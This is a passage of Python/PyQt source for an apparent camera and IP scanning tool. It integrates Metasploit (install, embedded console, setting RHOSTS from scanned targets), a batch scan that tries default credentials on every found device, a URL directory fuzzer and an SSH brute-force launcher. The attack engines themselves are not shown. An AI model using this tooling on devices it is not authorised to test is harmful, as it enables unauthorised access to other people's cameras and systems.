            "install dir or the app inherited a stale PATH). Saved across restarts.")
        self.msf_browse_btn.clicked.connect(self._browse_msfconsole)
        msf_row.addWidget(self.msf_browse_btn)
        self.msf_install_btn = QPushButton("Install Metasploit")
        self.msf_install_btn.clicked.connect(self._install_metasploit)
        msf_row.addWidget(self.msf_install_btn)
        self.msf_console_btn = QPushButton("Launch Console")
        self.msf_console_btn.setToolTip("Embedded console (quick commands; output can be buffered)")
        self.msf_console_btn.clicked.connect(self._toggle_msf_console)
        msf_row.addWidget(self.msf_console_btn)
        self.msf_terminal_btn = QPushButton("External Terminal")
        self.msf_terminal_btn.setToolTip(
            "Open msfconsole in a real terminal window - a proper TTY, so you get "
            "the FULL, live output (recommended over the embedded console).")
        self.msf_terminal_btn.clicked.connect(lambda: self._launch_msf_external())
        msf_row.addWidget(self.msf_terminal_btn)
        msf_v.addLayout(msf_row)

        self.msf_install_progress = QProgressBar()
        self.msf_install_progress.setVisible(False)
        msf_v.addWidget(self.msf_install_progress)

        # Embedded msfconsole - hidden until "Launch Console" is clicked.
        self.msf_console_widget = QWidget()
        msf_console_v = QVBoxLayout(self.msf_console_widget)
        msf_console_v.setContentsMargins(0, 0, 0, 0)
        self.msf_console_output = QTextEdit()
        self.msf_console_output.setReadOnly(True)
        self.msf_console_output.setStyleSheet(
            "background:#0a0a0a; color:#33ff66; "
            "font-family:Consolas,'Courier New',monospace; font-size:12px;")
        self.msf_console_output.setMinimumHeight(220)
        msf_console_v.addWidget(self.msf_console_output, 1)
        msf_input_row = QHBoxLayout()
        self.msf_console_input = QLineEdit()
        self.msf_console_input.setPlaceholderText(
            "Type a Metasploit command and press Enter (e.g. search dahua)")
        self.msf_console_input.returnPressed.connect(self._send_msf_command)
        msf_input_row.addWidget(self.msf_console_input, 1)
        self.msf_rhosts_btn = QPushButton("Set RHOSTS from selected")
        self.msf_rhosts_btn.setToolTip(
            "Send 'set RHOSTS <ip>' using the target selected in the table below")
        self.msf_rhosts_btn.clicked.connect(self._msf_set_rhosts_from_selection)
        msf_input_row.addWidget(self.msf_rhosts_btn)
        msf_send_btn = QPushButton("Send")
        msf_send_btn.clicked.connect(self._send_msf_command)
        msf_input_row.addWidget(msf_send_btn)
        msf_console_v.addLayout(msf_input_row)
        self.msf_console_widget.setVisible(False)
        msf_v.addWidget(self.msf_console_widget, 1)
        layout.addWidget(msf_group)

        self.vuln_overlay_summary = QLabel(
            "Fingerprints brand/model/firmware, checks known CVEs, and tries default "
            "credentials (HTTP/ONVIF/Telnet/SSH) on every IP in the Good tab. "
            "Select a row below for the full readable finding.")
        self.vuln_overlay_summary.setWordWrap(True)
        layout.addWidget(self.vuln_overlay_summary)

        self.vuln_overlay_progress = QProgressBar()
        layout.addWidget(self.vuln_overlay_progress)

        self.vuln_overlay_table = QTableWidget(0, 6)
        self.vuln_overlay_table.setHorizontalHeaderLabels(
            ["Target", "Brand", "Model", "Firmware", "Findings (H/M/L)", "Creds Found"])
        self.vuln_overlay_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.vuln_overlay_table.itemSelectionChanged.connect(self._on_vuln_overlay_row_selected)
        layout.addWidget(self.vuln_overlay_table, 1)

        self.vuln_overlay_detail = QTextEdit()
        self.vuln_overlay_detail.setReadOnly(True)
        self.vuln_overlay_detail.setPlaceholderText("Select a scanned target above to see its full findings here.")
        layout.addWidget(self.vuln_overlay_detail, 1)

        # Populate the Metasploit status line once the widget is built.
        try:
            self._refresh_msf_status()
        except Exception:
            pass

        return w

    def toggle_vuln_overlay(self, enabled: bool):
        """Show/hide the CVE overlay in browser_stack, mirroring toggle_pss_mode's
        switch/restore pattern. Called from the View menu's "Metasploit Overlay"
        checkable action - independent of Quick Search brand selection."""
        if not getattr(self, 'browser_stack', None) or not getattr(self, 'vuln_overlay_widget', None):
            return
        try:
            if enabled:
                # Remember if PSS mode was showing so leaving Metasploit restores
                # it, instead of always dropping back to the plain browser.
                self._pre_overlay_was_pss = (self.browser_stack.currentWidget() is getattr(self, 'pss_widget', None))
                try:
                    if getattr(self, 'web_view', None): self.web_view.hide()
                except Exception: pass
                try:
                    if getattr(self, 'ie_frame', None): self.ie_frame.hide()
                except Exception: pass
                self.browser_stack.setCurrentWidget(self.vuln_overlay_widget)
            else:
                if getattr(self, '_pre_overlay_was_pss', False) and getattr(self, 'pss_widget', None):
                    self.browser_stack.setCurrentWidget(self.pss_widget)
                elif getattr(self, 'use_ie', False):
                    self.browser_stack.setCurrentIndex(0)
                    try:
                        if getattr(self, 'ie_frame', None): self.ie_frame.show()
                    except Exception: pass
                else:
                    self.browser_stack.setCurrentIndex(1)
                    try:
                        if getattr(self, 'web_view', None): self.web_view.show()
                    except Exception: pass
                self._pre_overlay_was_pss = False
        except Exception as e:
            self.log(f"Vuln overlay toggle error: {e}", "warning")

    def _infer_port_for_row(self, table, row):
        """Best-effort port for a results-table row: prefer a common HTTP-ish
        port from the "Open Ports" column (IP Scanner/Dahua-style tables),
        else fall back to the Quick Search port field, else 80."""
        try:
            ports_item = table.item(row, 2)
            if ports_item and ports_item.text():
                candidates = [p.strip() for p in ports_item.text().split(",") if p.strip().isdigit()]
                for pref in ("80", "8080", "8000", "443", "37777"):
                    if pref in candidates:
                        return int(pref)
                if candidates:
                    return int(candidates[0])
        except Exception:
            pass
        try:
            if self.port_spin.isVisible():
                return self.port_spin.value()
        except Exception:
            pass
        return 80

    def _gather_good_targets(self):
        targets = []
        for row in range(self.good_table.rowCount()):
            item = self.good_table.item(row, 0)
            if not item or not item.text():
                continue
            ip = item.text().split()[-1]
            if ip:
                targets.append((ip, self._infer_port_for_row(self.good_table, row)))
        return targets

    def _start_batch_vuln_scan(self, targets=None):
        if self.batch_vuln_worker and self.batch_vuln_worker.isRunning():
            QMessageBox.information(self, "Scan Running", "A vulnerability scan is already running.")
            return
        if targets is None:
            targets = self._gather_good_targets()
        if not targets:
            QMessageBox.information(self, "No Targets", "No IPs in the Good tab to scan. Run a camera/IP scan first.")
            return
        # Scanning always runs and populates the overlay's table, regardless of
        # whether the overlay is currently the visible panel - the "Metasploit
        # Overlay" checkbox is what controls visibility, not this scan.
        if hasattr(self, 'vuln_overlay_table'):
            self.vuln_overlay_table.setRowCount(0)
            self.vuln_overlay_progress.setMaximum(len(targets))
            self.vuln_overlay_progress.setValue(0)
            self.vuln_overlay_detail.clear()
            self.vuln_overlay_summary.setText(f"Scanning {len(targets)} target(s)...")
        self.status_label.setText("Batch Vuln Scanning...")
        self.batch_vuln_worker = BatchVulnScanWorker(targets, timeout=self.timeout_spin.value(), concurrency=5)
        self.batch_vuln_worker.result_signal.connect(self._on_batch_vuln_result)
        self.batch_vuln_worker.progress_signal.connect(
            lambda done, total: self.vuln_overlay_progress.setValue(done) if hasattr(self, 'vuln_overlay_progress') else None)
        # log_signal emits (level, message); self.log expects (message, level).
        self.batch_vuln_worker.log_signal.connect(lambda level, msg: self.log(msg, level))
        self.batch_vuln_worker.finished_signal.connect(self._on_batch_vuln_finished)
        self.batch_vuln_worker.status_signal.connect(self.status_label.setText)
        self.batch_vuln_worker.start()
        self.log(f"🛡 Batch Vuln Scan started on {len(targets)} target(s).", "info")

    def open_metasploit_scan_on(self, ip):
        """Right-click entry point: run the CVE/exploit scan on a single IP and
        populate the overlay's table with it. Doesn't force the overlay into
        view - flip the "Metasploit Overlay" checkbox to go look at results."""
        row = None
        table, _ = self._get_active_table_and_key()
        port = 80
        if table:
            for r in range(table.rowCount()):
                item = table.item(r, 0)
                if item and item.text().split()[-1] == ip:
                    row = r
                    break
            if row is not None:
                port = self._infer_port_for_row(table, row)
        self._start_batch_vuln_scan(targets=[(ip, port)])

    def _on_batch_vuln_result(self, result):
        if not hasattr(self, 'vuln_overlay_table'):
            return
        findings = result.get("findings", [])
        high = sum(1 for sev, _ in findings if sev == "HIGH")
        med = sum(1 for sev, _ in findings if sev == "MED")
        low = sum(1 for sev, _ in findings if sev == "LOW")
        creds = result.get("working_creds", [])
        row = self.vuln_overlay_table.rowCount()
        self.vuln_overlay_table.insertRow(row)
        self.vuln_overlay_table.setItem(row, 0, QTableWidgetItem(f"{result['ip']}:{result['port']}"))
        self.vuln_overlay_table.setItem(row, 1, QTableWidgetItem(result.get("brand") or "Unknown"))
        self.vuln_overlay_table.setItem(row, 2, QTableWidgetItem(result.get("model") or ""))
        self.vuln_overlay_table.setItem(row, 3, QTableWidgetItem(result.get("firmware") or ""))
        self.vuln_overlay_table.setItem(row, 4, QTableWidgetItem(f"{high} HIGH / {med} MED / {low} LOW"))
        creds_str = "; ".join(f"{u}:{p} ({svc})" for svc, desc, u, p in creds) if creds else ""
        self.vuln_overlay_table.setItem(row, 5, QTableWidgetItem(creds_str))
        self.vuln_overlay_table.item(row, 0).setData(32, result)
        if high or creds:
            for col in range(self.vuln_overlay_table.columnCount()):
                cell = self.vuln_overlay_table.item(row, col)
                if cell:
                    cell.setForeground(QColor("#ff5555" if high else "#ffcc00"))

    def _on_vuln_overlay_row_selected(self):
        sel = self.vuln_overlay_table.selectionModel()
        rows = sel.selectedRows() if sel else []
        if not rows:
            return
        item = self.vuln_overlay_table.item(rows[0].row(), 0)
        result = item.data(32) if item else None
        if not result:
            return
        lines = [
            f"Target: {result['ip']}:{result['port']}",
            f"Brand: {result.get('brand') or 'Unknown'}   Model: {result.get('model') or '-'}   "
            f"Firmware: {result.get('firmware') or '-'}",
            "",
        ]
        creds = result.get("working_creds", [])
        if creds:
            lines.append("── WORKING CREDENTIALS ──")
            for svc, desc, u, p in creds:
                lines.append(f"  [{svc}] {u}:{p}" + (f" ({desc})" if desc else ""))
            lines.append("")
        lines.append("── FINDINGS ──")
        for sev, msg in result.get("findings", []):
            lines.append(f"[{sev}] {msg}")
        if result.get("error"):
            lines.append("")
            lines.append(f"Scan error: {result['error']}")
        self.vuln_overlay_detail.setPlainText("\n".join(lines))

    def _on_batch_vuln_finished(self, total):
        if hasattr(self, 'vuln_overlay_summary'):
            self.vuln_overlay_summary.setText(f"Batch Vuln Scan complete - {total} target(s) scanned.")
        self.status_label.setText("Idle")
        self.log(f"✅ Batch Vuln Scan complete: {total} target(s) scanned.", "success")

    # ------------------------------------------------------------------
    # Full Metasploit Framework integration (OS detect + install + msfconsole)
    # ------------------------------------------------------------------
    def _detect_os(self):
        """'Windows' | 'Linux' | 'Darwin' (macOS)."""
        try:
            return platform.system()
        except Exception:
            return "Windows" if os.name == "nt" else "Linux"

    def _find_msfconsole(self):
        """Return the path to an installed msfconsole, or None.
        Order: a user-picked path saved in settings (survives restarts and a
        stale PATH), then PATH, then the usual per-OS install locations."""
        # 1) Manually-selected path (via the Browse button) always wins.
        try:
            saved = self.settings.value("msf_path", "")
            if saved and os.path.exists(saved):
                return saved
        except Exception:
            pass
        # 2) On PATH.
        for name in ("msfconsole", "msfconsole.bat", "msfconsole.cmd"):
            p = shutil.which(name)
            if p:
                return p
        # 3) Common install locations across OSes / installer versions.
        candidates = [
            r"C:\metasploit-framework\bin\msfconsole.bat",
            r"C:\metasploit-framework\bin\msfconsole",
            r"C:\Program Files\Metasploit\bin\msfconsole.bat",
            r"C:\Program Files\metasploit-framework\bin\msfconsole.bat",
            r"C:\Program Files (x86)\Metasploit\bin\msfconsole.bat",
            r"C:\Tools\metasploit-framework\bin\msfconsole.bat",
            os.path.expandvars(r"%LOCALAPPDATA%\metasploit-framework\bin\msfconsole.bat"),
            "/opt/metasploit-framework/bin/msfconsole",
            "/usr/bin/msfconsole",
            "/usr/local/bin/msfconsole",
            "/opt/homebrew/bin/msfconsole",
            os.path.expanduser("~/.metasploit-framework/bin/msfconsole"),
        ]
        for c in candidates:
            try:
                if c and os.path.exists(c):
                    return c
            except Exception:
                continue
        return None

    def _browse_msfconsole(self):
        """Let the user point directly at their msfconsole launcher when
        auto-detection misses it (custom install dir or stale PATH). The choice
        is saved so it sticks across restarts."""
        start_dir = "C:\\" if self._detect_os() == "Windows" else "/"
        if self._detect_os() == "Windows":
            filt = "msfconsole (msfconsole.bat msfconsole.cmd);;All files (*)"
        else:
            filt = "msfconsole (msfconsole);;All files (*)"
        path, _ = QFileDialog.getOpenFileName(
            self, "Locate msfconsole", start_dir, filt)
        if not path:
            return
        base = os.path.basename(path).lower()
        if "msfconsole" not in base:
            resp = QMessageBox.question(
                self, "Confirm File",
                f"'{os.path.basename(path)}' doesn't look like msfconsole. Use it anyway?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if resp != QMessageBox.StandardButton.Yes:
                return
        self.settings.setValue("msf_path", path)
        self.log(f"Metasploit path set to {path}", "info")
        self._refresh_msf_status()

    def _refresh_msf_status(self):
        """Detect OS + whether Metasploit is installed, and update the status line."""
        system = self._detect_os()
        path = self._find_msfconsole()
        self._msf_path = path
        if path:
            self.msf_status_label.setText(f"Status: ✅ Metasploit found on {system} - {path}")
            self.msf_status_label.setStyleSheet("color:#33ff66;")
            self.msf_install_btn.setText("Reinstall / Update")
        else:
            self.msf_status_label.setText(
                f"Status: ⚠ Metasploit not installed on this {system} PC - click 'Install Metasploit'.")
            self.msf_status_label.setStyleSheet("color:#ffcc00;")
            self.msf_install_btn.setText("Install Metasploit")
        return path

    def _install_metasploit(self):
        system = self._detect_os()
        if getattr(self, 'msf_install_worker', None) and self.msf_install_worker.isRunning():
            QMessageBox.information(self, "Install Running", "Metasploit is already being downloaded.")
            return
        src = {
            "Windows": "the official Rapid7 Windows installer (metasploitframework-latest.msi)",
            "Linux": "Rapid7's official msfinstall script (needs sudo)",
            "Darwin": "Rapid7's official msfinstall script (needs sudo)",
        }.get(system, "the official Rapid7 installer")
        resp = QMessageBox.question(
            self, "Install Metasploit Framework",
            f"Detected OS: {system}\n\nThis downloads and launches {src}.\n"
            "Metasploit is a large download and its installer needs administrator/root rights.\n\nContinue?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if resp != QMessageBox.StandardButton.Yes:
            return
        self.msf_install_progress.setVisible(True)
        self.msf_install_progress.setRange(0, 100)
        self.msf_install_progress.setValue(0)
        self.msf_install_btn.setEnabled(False)
        self.msf_status_label.setText(f"Status: downloading Metasploit for {system}...")
        self.msf_status_label.setStyleSheet("color:#00d4ff;")
        self.msf_install_worker = MetasploitInstallWorker(system, parent=self)
        self.msf_install_worker.progress_signal.connect(self._on_msf_install_progress)
        self.msf_install_worker.log_signal.connect(lambda msg, lvl: self.log(msg, lvl))
        self.msf_install_worker.finished_signal.connect(self._on_msf_install_finished)
        self.msf_install_worker.start()
        self.log(f"🎯 Metasploit install started for {system}.", "info")

    def _on_msf_install_progress(self, done, total):
        if total > 0:
            self.msf_install_progress.setRange(0, 100)
            self.msf_install_progress.setValue(int(done * 100 / total))
        else:
            self.msf_install_progress.setRange(0, 0)  # indeterminate (unknown size)

    def _on_msf_install_finished(self, ok, message):
        self.msf_install_btn.setEnabled(True)
        self.msf_install_progress.setVisible(False)
        if ok:
            self.msf_status_label.setText("Status: installer launched - finish it, then click 'Detect'.")
            self.msf_status_label.setStyleSheet("color:#00d4ff;")
            QMessageBox.information(self, "Metasploit Installer", message)
        else:
            self.msf_status_label.setText("Status: install failed - see Logs.")
            self.msf_status_label.setStyleSheet("color:#ff5555;")
            QMessageBox.warning(self, "Metasploit Install Failed", message)
        self._refresh_msf_status()

    def _launch_msf_external(self, pre_cmds=None):
        """Launch msfconsole in a REAL external terminal window (a proper TTY) so
        the user gets full, live output - the embedded QProcess pipe block-buffers
        Ruby's stdout and can't reliably stream. Optional pre_cmds are written to
        a Metasploit resource script (-r) that runs at startup, then it drops to
        an interactive prompt the user can keep typing into."""
        path = self._find_msfconsole()
        if not path:
            QMessageBox.warning(
                self, "Metasploit Not Found",
                "Install or locate Metasploit first via the Metasploit Overlay "
                "(Install Metasploit / Browse).")
            return
        rc_path = None
        if pre_cmds:
            try:
                rc_path = os.path.join(tempfile.gettempdir(), "educam_msf.rc")
                with open(rc_path, "w", encoding="utf-8") as f:
                    f.write("\n".join(pre_cmds) + "\n")
            except Exception:
                rc_path = None
        system = self._detect_os()
        try:
            if system == "Windows":
                # cmd /k keeps the window open; msfconsole runs with a real
                # console (ConPTY), so output is unbuffered and complete.
                args = ["cmd", "/k", path, "-q"]
                if rc_path:
                    args += ["-r", rc_path]
                flags = getattr(subprocess, "CREATE_NEW_CONSOLE", 0x00000010)
                subprocess.Popen(args, creationflags=flags)
            elif system == "Darwin":
                inner = f'"{path}" -q' + (f' -r "{rc_path}"' if rc_path else "")
                sh = os.path.join(tempfile.gettempdir(), "educam_msf_run.command")
                with open(sh, "w") as f:
                    f.write(f"#!/bin/bash\n{inner}\n")
                os.chmod(sh, 0o755)
                subprocess.Popen(["open", "-a", "Terminal", sh])
            else:
                inner = f'"{path}" -q' + (f' -r "{rc_path}"' if rc_path else "")
                launched = False
                for term in ("x-terminal-emulator", "gnome-terminal", "konsole",
                             "xfce4-terminal", "xterm"):
                    p = shutil.which(term)
                    if not p:
                        continue
                    try:
                        if term in ("gnome-terminal", "xfce4-terminal"):
                            subprocess.Popen([p, "--", "bash", "-c", f"{inner}; exec bash"])
                        else:
                            subprocess.Popen([p, "-e", f"bash -c '{inner}; exec bash'"])
                        launched = True
                        break
                    except Exception:
                        continue
                if not launched:
                    subprocess.Popen(["bash", "-c", inner])
            self.log("Launched Metasploit in an external terminal (full output).", "success")
        except Exception as e:
            QMessageBox.warning(self, "Launch Failed",
                                f"Could not open an external terminal: {e}")

    def _toggle_msf_console(self):
        """Show/hide the embedded console; start msfconsole on first show."""
        if self.msf_console_widget.isVisible():
            self.msf_console_widget.setVisible(False)
            self.msf_console_btn.setText("Launch Console")
            return
        path = self._find_msfconsole()
        if not path:
            QMessageBox.warning(
                self, "Metasploit Not Found",
                "msfconsole isn't installed yet. Click 'Install Metasploit' first, "
                "finish the installer, then 'Detect'.")
            return
        self.msf_console_widget.setVisible(True)
        self.msf_console_btn.setText("Hide Console")
        if not getattr(self, 'msf_process', None) or self.msf_process.state() == QProcess.ProcessState.NotRunning:
            self._start_msf_console(path)

    def _start_msf_console(self, path):
        self.msf_console_output.clear()
        self.msf_console_output.append(
            f"Starting Metasploit console:\n  {path}\n"
            "(First launch can take 20-60s while Metasploit loads.)\n")
        # Prompt-paced command queue: msfconsole is interactive over a non-TTY
        # pipe, so commands must be fed ONE AT A TIME, each only after the
        # 'msf > ' prompt reappears - firing them early (on a timer) just stuffs
        # stdin before Metasploit is ready and the output never lines up.
        self._msf_cmd_queue = []
        self._msf_tail = ""
        self._msf_ready = False
        self._msf_at_prompt = False
        self.msf_process = QProcess(self)
        self.msf_process.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
        self.msf_process.readyReadStandardOutput.connect(self._read_msf_output)
        self.msf_process.finished.connect(self._on_msf_process_finished)
        # On Windows msfconsole is a .bat - run it through cmd.exe so QProcess
        # inherits a proper environment; elsewhere run the script directly.
        if self._detect_os() == "Windows":
            self.msf_process.setProgram("cmd.exe")
            self.msf_process.setArguments(["/c", path, "-q"])
        else:
            self.msf_process.setProgram(path)
            self.msf_process.setArguments(["-q"])
        try:
            self.msf_process.start()
        except Exception as e:
            self.msf_console_output.append(f"\n[error] Could not start msfconsole: {e}")

    def _read_msf_output(self):
        if not getattr(self, 'msf_process', None):
            return
        try:
            data = bytes(self.msf_process.readAllStandardOutput()).decode("utf-8", errors="replace")
        except Exception:
            return
        if data:
            cursor = self.msf_console_output.textCursor()
            cursor.movePosition(cursor.MoveOperation.End)
            self.msf_console_output.setTextCursor(cursor)
            self.msf_console_output.insertPlainText(data)
            self.msf_console_output.moveCursor(cursor.MoveOperation.End)
            self._pace_msf_queue(data)

    def _pace_msf_queue(self, data):
        """Watch msfconsole's output for the 'msf > ' prompt (printed without a
        trailing newline) and release the next queued command only then."""
        tail = getattr(self, '_msf_tail', "") + data
        tail = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", tail)  # strip ANSI colour codes
        self._msf_tail = tail[-800:]
        last_line = self._msf_tail.rstrip("\r\n").split("\n")[-1].strip()
        if last_line.startswith("msf") and last_line.endswith(">"):
            self._msf_ready = True
            self._msf_at_prompt = True
            self._flush_msf_queue()

    def _queue_msf_commands(self, cmds):
        """Queue commands to run in the embedded console, paced to the prompt.
        If msfconsole is already sitting at a prompt, the first one goes now."""
        q = getattr(self, '_msf_cmd_queue', None)
        if q is None:
            q = self._msf_cmd_queue = []
        q.extend([c for c in cmds if c])
        if getattr(self, '_msf_at_prompt', False):
            self._flush_msf_queue()

    def _flush_msf_queue(self):
        if not getattr(self, 'msf_process', None):
            return
        if self.msf_process.state() == QProcess.ProcessState.NotRunning:
            return
        q = getattr(self, '_msf_cmd_queue', None)
        if not q:
            return
        cmd = q.pop(0)
        self.msf_console_output.append(f"\nmsf > {cmd}")
        try:
            self.msf_process.write((cmd + "\n").encode("utf-8"))
        except Exception as e:
            self.msf_console_output.append(f"\n[error writing command: {e}]")
        # Consume the current prompt so this same prompt can't immediately pop
        # another command; the NEXT prompt (after this command runs) releases it.
        self._msf_at_prompt = False
        self._msf_tail = ""

    def _on_msf_process_finished(self, *args):
        try:
            self.msf_console_output.append("\n[msfconsole exited]")
        except Exception:
            pass

    def _send_msf_command(self):
        cmd = self.msf_console_input.text()
        if not getattr(self, 'msf_process', None) or self.msf_process.state() == QProcess.ProcessState.NotRunning:
            self.msf_console_output.append("\n[console not running - click 'Launch Console']")
            return
        self.msf_console_output.append(f"\nmsf > {cmd}")
        try:
            self.msf_process.write((cmd + "\n").encode("utf-8"))
        except Exception as e:
            self.msf_console_output.append(f"\n[error writing command: {e}]")
        self._msf_at_prompt = False
        self.msf_console_input.clear()

    def _msf_set_rhosts_from_selection(self):
        """Glue between the CVE table and msfconsole: push the selected row's IP
        into Metasploit as RHOSTS so the user can jump straight to a module."""
        ip = None
        try:
            sel = self.vuln_overlay_table.selectionModel()
            rows = sel.selectedRows() if sel else []
            if rows:
                item = self.vuln_overlay_table.item(rows[0].row(), 0)
                if item and item.text():
                    ip = item.text().split(":")[0].strip()
        except Exception:
            pass
        if not ip:
            QMessageBox.information(self, "No Target Selected",
                                    "Select a scanned row in the table below first.")
            return
        if not self.msf_console_widget.isVisible():
            self._toggle_msf_console()
        self.msf_console_input.setText(f"set RHOSTS {ip}")
        self._send_msf_command()

    # ------------------------------------------------------------------
    # URL Fuzzer - free/built-in directory & file discovery (Stage 3)
    # ------------------------------------------------------------------
    def _load_builtin_wordlist(self):
        path = self.resource_path("wordlists/common_dirs.txt")
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return f.readlines()
        except Exception as e:
            self.log(f"Could not load built-in fuzz wordlist: {e}", "warning")
            return []

    def open_url_fuzzer(self, prefill_target=""):
        if not prefill_target:
            table, key = self._get_active_table_and_key()
            if table and table.currentRow() >= 0:
                try:
                    ip_cell = table.item(table.currentRow(), 0)
                    if ip_cell:
                        text = ip_cell.text()
                        prefill_target = text.split()[-1] if text else ""
                except Exception:
                    pass
        if not prefill_target and self.url_bar.text().strip():
            prefill_target = self.url_bar.text().strip()

        dlg = QDialog(self)
        dlg.setWindowTitle("URL Fuzzer - Directory & File Discovery")
        dlg.resize(720, 560)
        layout = QVBoxLayout(dlg)

        form = QFormLayout()
        target_edit = QLineEdit(prefill_target)
        target_edit.setPlaceholderText("IP, host:port, or full http(s)://... URL")
        form.addRow("Target:", target_edit)

        wordlist_combo = QComboBox()
        wordlist_combo.addItems(["Built-in (common + camera/DVR paths)", "Custom wordlist file..."])
        form.addRow("Wordlist:", wordlist_combo)

        custom_row = QHBoxLayout()
        custom_path_edit = QLineEdit()
        custom_path_edit.setReadOnly(True)
        custom_path_edit.setPlaceholderText("No file selected")
        custom_path_edit.setEnabled(False)
        browse_btn = QPushButton("Browse...")
        browse_btn.setEnabled(False)
        custom_row.addWidget(custom_path_edit, 1)
        custom_row.addWidget(browse_btn)
        form.addRow("", custom_row)

        def on_wordlist_changed(idx):
            is_custom = idx == 1
            custom_path_edit.setEnabled(is_custom)
            browse_btn.setEnabled(is_custom)
        wordlist_combo.currentIndexChanged.connect(on_wordlist_changed)

        def browse_wordlist():
            p, _ = QFileDialog.getOpenFileName(dlg, "Select wordlist file", "", "Text Files (*.txt);;All Files (*)")
            if p:
                custom_path_edit.setText(p)
        browse_btn.clicked.connect(browse_wordlist)

        ext_edit = QLineEdit()
        ext_edit.setPlaceholderText("e.g. php,html,txt (optional - blank = paths as-is)")
        form.addRow("Extensions:", ext_edit)

        concurrency_spin = QSpinBox(); concurrency_spin.setRange(1, 100); concurrency_spin.setValue(20)
        form.addRow("Concurrency:", concurrency_spin)
        fuzz_timeout_spin = QSpinBox(); fuzz_timeout_spin.setRange(1, 30); fuzz_timeout_spin.setValue(5)
        form.addRow("Timeout (s):", fuzz_timeout_spin)

        layout.addLayout(form)

        progress = QProgressBar()
        layout.addWidget(progress)

        results_table = QTableWidget(0, 5)
        results_table.setHorizontalHeaderLabels(["Status", "Path", "Size", "URL", "Action"])
        results_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        layout.addWidget(results_table, 1)

        summary_label = QLabel("Only interesting results (200/301/302/401/403/...) are listed - 404s are hidden.")
        summary_label.setWordWrap(True)
        layout.addWidget(summary_label)

        btn_row = QHBoxLayout()
        start_btn = QPushButton("Start")
        stop_btn = QPushButton("Stop")
        stop_btn.setEnabled(False)
        close_btn = QPushButton("Close")
        btn_row.addWidget(start_btn)
        btn_row.addWidget(stop_btn)
        btn_row.addWidget(close_btn)
        layout.addLayout(btn_row)

        state = {"worker": None}

        def add_hit(hit):
            row = results_table.rowCount()
            results_table.insertRow(row)
            results_table.setItem(row, 0, QTableWidgetItem(str(hit["code"])))
            results_table.setItem(row, 1, QTableWidgetItem(hit["path"]))
            results_table.setItem(row, 2, QTableWidgetItem(str(hit.get("size", ""))))
            results_table.setItem(row, 3, QTableWidgetItem(hit["url"]))
            open_btn = QPushButton("Open")
            open_btn.clicked.connect(lambda checked, u=hit["url"]: self.open_link(u))
            results_table.setCellWidget(row, 4, open_btn)

        def on_progress(tested, total):
            progress.setMaximum(max(1, total))
            progress.setValue(tested)

        def on_finished(tested, hits):
            start_btn.setEnabled(True)
            stop_btn.setEnabled(False)
            summary_label.setText(f"Done - {tested} paths tested, {hits} interesting result(s) found.")
            self.status_label.setText("Idle")

        def start_fuzz():
            target = target_edit.text().strip()
            if not target:
                QMessageBox.warning(dlg, "Missing Target", "Enter a target IP or URL.")
                return
            if not target.startswith(("http://", "https://")):
                target = f"http://{target}"

            if wordlist_combo.currentIndex() == 1:
                custom_path = custom_path_edit.text().strip()
                if not custom_path or not Path(custom_path).exists():
                    QMessageBox.warning(dlg, "Missing Wordlist", "Select a custom wordlist file first.")
                    return
                try:
                    with open(custom_path, "r", encoding="utf-8", errors="ignore") as f:
                        wordlist = f.readlines()
                except Exception as e:
                    QMessageBox.warning(dlg, "Wordlist Error", f"Could not read wordlist: {e}")
                    return
            else:
                wordlist = self._load_builtin_wordlist()
            if not wordlist:
                QMessageBox.warning(dlg, "Empty Wordlist", "The selected wordlist has no entries.")
                return

            extensions = [""]
            ext_text = ext_edit.text().strip()
            if ext_text:
                extensions = [""] + [("." + e.strip().lstrip(".")) for e in ext_text.split(",") if e.strip()]

            results_table.setRowCount(0)
            progress.setValue(0)
            summary_label.setText("Starting...")
            start_btn.setEnabled(False)
            stop_btn.setEnabled(True)

            proxies = {}
            http_proxy = self.proxy_http.text().strip()
            if http_proxy:
                proxies["http"] = http_proxy
                proxies["https"] = http_proxy

            worker = DirFuzzWorker(target, wordlist, extensions=extensions,
                                    timeout=fuzz_timeout_spin.value(),
                                    concurrency=concurrency_spin.value(),
                                    proxies=proxies)
            worker.hit_found.connect(add_hit)
            worker.progress_signal.connect(on_progress)
            # log_signal emits (level, message); self.log expects (message, level).
            worker.log_signal.connect(lambda level, msg: self.log(msg, level))
            worker.finished_signal.connect(on_finished)
            worker.status_signal.connect(self.status_label.setText)
            state["worker"] = worker
            worker.start()

        def stop_fuzz():
            w = state.get("worker")
            if w and w.isRunning():
                w.stop()
            stop_btn.setEnabled(False)

        def on_close():
            w = state.get("worker")
            if w and w.isRunning():
                w.stop()
                w.wait(1000)
            dlg.accept()

        start_btn.clicked.connect(start_fuzz)
        stop_btn.clicked.connect(stop_fuzz)
        close_btn.clicked.connect(on_close)

        dlg.exec()

    # ------------------------------------------------------------------
    # SSH Integration
    # ------------------------------------------------------------------
    def open_ssh_brute_force(self):
        """Open the ported SSH Brute Force tool in its own window, pre-filling
        the target host from the currently-selected result row if any."""
        try:
            from modules.ssh_bruteforce import SshBruteForceDialog
        except Exception as e:
            self.log(f"Could not load SSH Brute Force module: {e}", "error")
            return
        ip = ""
        table, _ = self._get_active_table_and_key()
        if table and table.currentRow() >= 0:
            item = table.item(table.currentRow(), 0)
            if item:
                ip = item.text().split()[-1]  # strip flag emoji
        dlg = SshBruteForceDialog(self)
        if ip:
            dlg.host_input.setText(ip)
        # keep a reference so the non-modal window is not garbage-collected
        if not hasattr(self, "_ssh_brute_windows"):
            self._ssh_brute_windows = []
        self._ssh_brute_windows.append(dlg)
        dlg.show()

    def open_ssh_dialog(self):
        ip = ""
        table, _ = self._get_active_table_and_key()
        if table and table.currentRow() >= 0:
            item = table.item(table.currentRow(), 0)
            if item:
                ip = item.text().split()[-1]  # strip flag emoji
        dlg = QDialog(self)
        dlg.setWindowTitle("SSH Quick Connect")
        layout = QFormLayout(dlg)
        ip_edit = QLineEdit(ip)
        port_edit = QSpinBox(); port_edit.setRange(1,65535); port_edit.setValue(22)
        user_edit = QLineEdit("root")
        pass_edit = QLineEdit(); pass_edit.setEchoMode(QLineEdit.EchoMode.Password)
        layout.addRow("IP:", ip_edit)
